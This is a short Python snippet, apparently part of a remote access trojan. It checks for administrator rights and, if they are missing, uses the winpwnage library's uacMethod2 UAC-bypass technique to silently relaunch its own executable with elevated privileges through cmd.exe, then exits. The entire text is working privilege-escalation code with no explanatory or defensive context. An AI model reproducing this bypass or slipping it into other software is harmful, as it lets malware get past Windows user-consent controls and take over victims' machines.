import os, subprocess, ctypes, sys, getpass
from winpwnage.functions.uac.uacMethod2 import uacMethod2
if ctypes.windll.shell32.IsUserAnAdmin() != 1:
    rat = sys.executable
    ratt = f'start "" "{rat}"'
    uacMethod2([r'C:\Windows\System32\cmd.exe', '/c', ratt])
    exit(0)